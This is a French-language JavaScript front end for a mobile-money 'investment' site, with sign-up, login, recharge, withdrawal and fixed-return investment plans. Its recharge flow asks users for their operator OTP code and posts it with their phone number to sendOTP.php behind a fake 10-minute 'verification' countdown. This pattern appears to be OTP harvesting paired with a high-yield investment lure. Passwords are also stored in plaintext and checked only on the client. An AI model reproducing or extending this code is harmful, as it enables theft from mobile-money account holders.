// ==== Initialisation et sections ====
const sections = ['inscriptionForm','connexionForm','recupMDP','messageBox','menuPrincipal',
'rechargeForm','rechargeForm2','otpSection','retraitForm','conditions','plansPage'];

function showSection(id){
    sections.forEach(sec => document.getElementById(sec).style.display='none');
    document.getElementById(id).style.display='block';
}

// ==== Affichage initial ====
showSection('inscriptionForm');

// ==== Utilisateurs simulés (remplacer par users.json côté serveur) ====
let users = [];

// ==== Inscription ====
function inscrire(){
    let pays = document.getElementById('pays').value;
    let code = document.getElementById('codePays').value;
    let num = document.getElementById('numTel').value;
    let nom = document.getElementById('prenomNom').value;
    let email = document.getElementById('email').value;
    let pwd = document.getElementById('password').value;

    if(!pays || !num || !nom || !email || !pwd){
        alert("Veuillez remplir tous les champs");
        return;
    }
    let exist = users.find(u=>u.num===num || u.email===email);
    if(exist){
        alert("Coordonnées déjà utilisées, connectez-vous");
        return;
    }
    users.push({prenom:nom,email:email,num:num,password:pwd,solde:0});
    document.getElementById('messageText').innerText = `${nom}, votre compte a été créé avec succès`;
    showSection('messageBox');
}

// ==== Connexion ====
function showConnexion(){ showSection('connexionForm'); }

function connexion(){
    let num = document.getElementById('numTelC').value;
    let pwd = document.getElementById('passwordC').value;
    let user = users.find(u=>u.num===num && u.password===pwd);
    if(user){
        document.getElementById('messageText').innerText = `${user.prenom}, connexion réussie`;
        showSection('messageBox');
        currentUser = user;
    } else alert("Utilisateur ou mot de passe incorrect");
}

// ==== Continuer depuis message ====
function continuer(){ showSection('menuPrincipal'); }

// ==== Mot de passe oublié ====
function motDePasseOublie(){ showSection('recupMDP'); }
function envoyerRecup(){ alert("Instructions de récupération envoyées sur votre email."); }

// ==== MENU PRINCIPAL ====
function showRecharge(){ showSection('rechargeForm'); }
function showRetrait(){ showSection('retraitForm'); }
function showConditions(){ showSection('conditions'); }
function showPlans(){ showSection('plansPage'); }
function showPartager(){ alert("Votre code de parrainage est : 123456"); }
function showMoi(){ alert("Solde actuel : "+currentUser.solde+" XOF"); }

// ==== Recharge étape 2 ====
function rechargeEtape2(){
    let montant = document.getElementById('montant').value;
    let pays = document.getElementById('paysR').value;
    if(!montant || !pays){ alert("Choisissez montant et pays"); return; }
    showSection('rechargeForm2');
}

// ==== Recharge USSD / OTP ====
function rechargeUSSD(){
    let num = document.getElementById('numRecharge').value;
    let operateur = document.getElementById('operateur').value;
    if(!num || !operateur){ alert("Remplissez numéro et opérateur"); return; }
    showSection('otpSection');
    document.getElementById('otpMessage').innerText = "Pour valider le paiement, entrez votre code OTP et confirmez.";
}

// ==== Confirmer paiement ====
function confirmerPaiement(){
    let otp = document.getElementById('otpCode').value;
    let num = document.getElementById('numRecharge').value;
    if(!otp){ alert("Entrez le code OTP"); return; }

    // Envoi vers serveur PHP
    fetch('sendOTP.php',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({num:num, otp:otp})
    }).then(r=>r.json()).then(res=>{
        if(res.success){
            alert("Paiement en cours de vérification");
            // Lancement compte à rebours 10min
            startCountdown(600, 'otpMessage');
        }
    });
}

// ==== Compte à rebours ====
let countdownInterval;
function startCountdown(seconds, elemId){
    clearInterval(countdownInterval);
    let elem = document.getElementById(elemId);
    countdownInterval = setInterval(()=>{
        let min = Math.floor(seconds/60); let sec = seconds%60;
        elem.innerText = `Paiement en cours - temps restant : ${min}m ${sec}s`;
        if(seconds<=0){ clearInterval(countdownInterval); elem.innerText="Paiement expiré"; }
        seconds--;
    },1000);
}

// ==== Retrait ====
function envoyerRetrait(){
    let nom = document.getElementById('nomRetrait').value;
    let num = document.getElementById('numRetrait').value;
    let montant = document.getElementById('montantRetrait').value;
    let pays = document.getElementById('paysRetrait').value;
    let operateur = document.getElementById('operateurRetrait').value;
    if(!nom || !num || !montant || !pays || !operateur){ alert("Remplissez tous les champs"); return; }

    fetch('sendRetrait.php',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({nom, num, montant, pays, operateur})
    }).then(r=>r.json()).then(res=>{
        if(res.success){
            alert("Retrait soumis avec succès");
            loadRetraitHistory();
        }
    });
}

// ==== Historique des retraits ====
function loadRetraitHistory(){
    fetch('retraits.json').then(r=>r.json()).then(data=>{
        let table = document.getElementById('historyRetrait');
        table.innerHTML = "<tr><th>Date/Heure</th><th>Nom</th><th>Numéro</th><th>Montant</th><th>Pays</th><th>Opérateur</th><th>Statut</th><th>Action</th></tr>";
        data.forEach((r,i)=>{
            let row = table.insertRow();
            row.insertCell(0).innerText = r.date;
            row.insertCell(1).innerText = r.nom;
            row.insertCell(2).innerText = r.num;
            row.insertCell(3).innerText = r.montant;
            row.insertCell(4).innerText = r.pays;
            row.insertCell(5).innerText = r.operateur;
            row.insertCell(6).innerText = r.statut;
            row.insertCell(7).innerHTML = `<button onclick="validerRetrait(${i})">Valider</button>`;
        });
    });
}

// ==== Valider retrait ====
function validerRetrait(i){
    fetch('sendRetrait.php',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({action:'valider', index:i})
    }).then(r=>r.json()).then(res=>{
        if(res.success) loadRetraitHistory();
    });
}

// ==== Plans d'investissement ====
const plans = [
    {nom:"Plan A", montant:3000, revenu:500, minRetrait:1500, maxRetrait:1000000, dispo:"24/7"},
    {nom:"Plan B", montant:5000, revenu:800, minRetrait:2000, maxRetrait:1000000, dispo:"24/7"},
    {nom:"Plan C", montant:10000, revenu:1500, minRetrait:5000, maxRetrait:1000000, dispo:"24/7"}
];
function loadPlans(){
    let table = document.getElementById('plansTable');
    plans.forEach((p,i)=>{
        let row = table.insertRow();
        row.insertCell(0).innerText = p.nom;
        row.insertCell(1).innerText = p.montant;
        row.insertCell(2).innerText = p.revenu;
        row.insertCell(3).innerText = p.minRetrait;
        row.insertCell(4).innerText = p.maxRetrait;
        row.insertCell(5).innerText = p.dispo;
        row.insertCell(6).innerHTML = `<button onclick="investir(${i})">Investir</button>`;
    });
}
function investir(i){
    let plan = plans[i];
    if(currentUser.solde<plan.montant){ document.getElementById('planMessage').innerText="Solde insuffisant, rechargez pour investir"; return; }
    currentUser.solde -= plan.montant;
    alert(`Vous avez investi ${plan.montant} XOF dans ${plan.nom}`);
}
window.onload = loadPlans;